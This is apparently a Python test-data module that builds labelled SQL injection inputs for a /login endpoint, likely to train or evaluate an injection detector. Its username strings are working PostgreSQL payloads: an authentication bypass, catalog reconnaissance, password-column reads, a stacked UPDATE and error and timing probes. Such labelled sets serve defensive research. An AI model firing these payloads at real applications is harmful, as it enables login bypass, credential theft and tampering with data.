"""Small deterministic pilot suite; all payloads enter via POST /login.

Labels describe attempted behavior, independently of execution success.
An action is one driver execute / HTTP request, not each SQL substatement.
"""
LABELS = ["normal", "recon", "auth_bypass", "data_read", "data_write", "unknown"]


def actions(variant=0, split="known"):
    tag = f"demo_{variant}"
    if split == "novel":
        return [
            dict(group="auth_bypass", family="case_predicate", label="auth_bypass",
                 username=f"{tag}' OR CASE WHEN 3>2 THEN true ELSE false END -- "),
            dict(group="catalog", family="xml_catalog", label="recon",
                 username=f"{tag}' OR length(query_to_xml($$SELECT table_name FROM information_schema.tables$$,true,false,'' )::text)>0 -- "),
            dict(group="data_read", family="xml_catalog", label="data_read",
                 username=f"{tag}' OR length(query_to_xml($$SELECT password FROM users$$,true,false,'')::text)>0 -- "),
        ]
    return [
        dict(group="benign", family="normal", label="normal", username=tag),
        dict(group="auth_bypass", family="boolean", label="auth_bypass",
             username=f"{tag}' OR 'x'='x' -- "),
        dict(group="catalog", family="catalog_exists", label="recon",
             username=f"{tag}' OR EXISTS (SELECT 1 FROM information_schema.tables) -- "),
        dict(group="data_read", family="scalar_read", label="data_read",
             username=f"{tag}' OR (SELECT length(password)>0 FROM users LIMIT 1) -- "),
        dict(group="data_write", family="stacked", label="data_write",
             username=f"{tag}'; UPDATE users SET bio='lab-demo' WHERE username='{tag}'; SELECT * FROM users WHERE false -- "),
        dict(group="syntax_error", family="malformed", label="unknown", username=f"{tag}' ) broken -- "),
        dict(group="runtime_error", family="error_probe", label="recon",
             username=f"{tag}' OR 1/(length(current_database())-length(current_database()))=1 -- "),
        dict(group="timing", family="time_probe", label="recon",
             username=f"{tag}' OR (SELECT 1 FROM pg_sleep(0.05))=1 -- "),
    ]
